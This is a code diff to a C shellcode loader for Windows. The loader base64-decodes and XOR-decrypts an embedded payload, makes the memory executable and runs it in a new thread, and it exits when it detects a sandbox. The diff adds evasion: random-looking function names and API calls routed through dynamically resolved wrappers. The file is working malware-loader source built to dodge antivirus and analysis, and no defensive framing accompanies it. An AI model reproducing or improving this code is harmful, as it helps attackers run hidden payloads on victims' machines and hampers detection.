@@ -7,7 +7,6 @@
 #pragma comment (lib, "Crypt32.lib")
 
 /// User defined headers
-#include "obfuscators.h"
 #include "sandbox.h"
 
 // Payload String - Level 2
@@ -44,13 +43,6 @@ unsigned char payload[] = {
 
 // Length of payload array
 unsigned int payload_len = (unsigned int)(sizeof(payload)/sizeof(payload[0]));
-
-// XOR key
-const char XOR_KEY[] = "abcdefghijklmnopqrstuvwxyz";
-
-// Length of XOR key
-unsigned int xor_key_len = (int)(sizeof(XOR_KEY)/sizeof(XOR_KEY[0]))-1;
-
   
 /// Main Function
 ///
@@ -62,6 +54,7 @@ unsigned int xor_key_len = (int)(sizeof(XOR_KEY)/sizeof(XOR_KEY[0]))-1;
 ///  -4 - WaitForSingleObject() failed
 ///  -5 - Base64 decoding failed while trying to assess the length of the resulting string
 ///  -6 - Base64 decoding failed 
+/// -98 - Failed to populate functions
 /// -99 - Sandbox check failed
 int main(void){
     BOOL rv;
@@ -71,51 +64,57 @@ int main(void){
     void * exec_mem;
     DWORD oldprotect = 0;
     DWORD decoded_data_len;
+    
+    // Populate functions
+    if (__get_funcs() != 0){    
+        // fprintf(stderr, "Failed to populate functions\nCode: %d\n", funs);
+        return -98;
+    }
 
     // Check for sandbox
-    if (check_sandbox() != 0) {
+    if (wUtMwCHxxt10() != 0) {
         // fprintf(stderr, "Sandbox Environment!\n");
         return -99;
     }
 
-    b64_return = CryptStringToBinaryA((LPCSTR) payload, payload_len, CRYPT_STRING_BASE64, NULL, &decoded_data_len, NULL, NULL);
+    b64_return = _CryptStringToBinaryA((LPCSTR) payload, payload_len, CRYPT_STRING_BASE64, NULL, &decoded_data_len, NULL, NULL);
     if (b64_return == NULL){
         // fprintf(stderr, "Base64 Decoding Failed with error: %d\n", GetLastError());
         return -5;
     }
 
     // Allocate a memory buffer for payload
-    exec_mem = VirtualAlloc(0, decoded_data_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    exec_mem = _VirtualAlloc(0, decoded_data_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (exec_mem == NULL){
         // fprintf(stderr, "VirtualAlloc Failed with error code: %d\n", GetLastError());
         return -1;
     }
 
     // Decode the string
-    b64_return = CryptStringToBinaryA((LPCSTR) payload, payload_len, CRYPT_STRING_BASE64, (BYTE * )exec_mem, &decoded_data_len, NULL, NULL);
+    b64_return = _CryptStringToBinaryA((LPCSTR) payload, payload_len, CRYPT_STRING_BASE64, (BYTE * )exec_mem, &decoded_data_len, NULL, NULL);
     if (b64_return == NULL){
         // fprintf(stderr, "Base64 Decoding Failed with error: %d\n", GetLastError());
         return -6;
     }
 
     // XOR Payload
-    XOR((unsigned char*)exec_mem, decoded_data_len, XOR_KEY, xor_key_len);
+    LCzOatFaVf71((unsigned char*)exec_mem, decoded_data_len, XOR_KEY, xor_key_len);
 
     // Make new buffer as executable
-    rv = VirtualProtect(exec_mem, decoded_data_len, PAGE_EXECUTE_READ, &oldprotect);
+    rv = _VirtualProtect(exec_mem, decoded_data_len, PAGE_EXECUTE_READ, &oldprotect);
     if ( rv == 0 ) {
         // fprintf(stderr, "VirtualProtect Failed with error code: %d\n", GetLastError());
         return -2;
     }
 
     // Create Thread To run shellcode
-    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+    th = _CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
     if (th == NULL){
         // fprintf(stderr, "CreateThread Failed with error code: %d\n", GetLastError());
         return -3;
     }
 
-    _event = WaitForSingleObject(th, -1);
+    _event = _WaitForSingleObject(th, -1);
     if(_event == WAIT_FAILED){
         // fprintf(stderr, "WaitForSingleObject Failed with error code: %d\n", GetLastError());
         return -4;
